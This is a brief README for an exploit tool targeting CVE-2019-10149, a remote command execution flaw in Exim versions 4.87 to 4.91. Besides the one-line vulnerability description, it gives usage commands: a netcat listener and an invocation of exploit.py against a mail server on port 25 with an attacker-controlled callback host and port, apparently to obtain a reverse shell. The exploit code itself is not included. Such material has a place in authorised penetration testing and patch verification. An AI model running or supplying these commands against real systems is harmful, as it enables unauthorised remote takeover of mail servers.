# CVE-2019-10149
CVE-2019-10149 : A flaw was found in Exim versions 4.87 to 4.91 (inclusive). Improper validation of recipient address in deliver_message() function in /src/deliver.c may lead to remote command execution.

### Example
```
nc -lvp 9000
python ./CVE-2019-10149/exploit.py --rhost example.com --rport 25 --lhost 10.10.10.100 --lport 9000
```
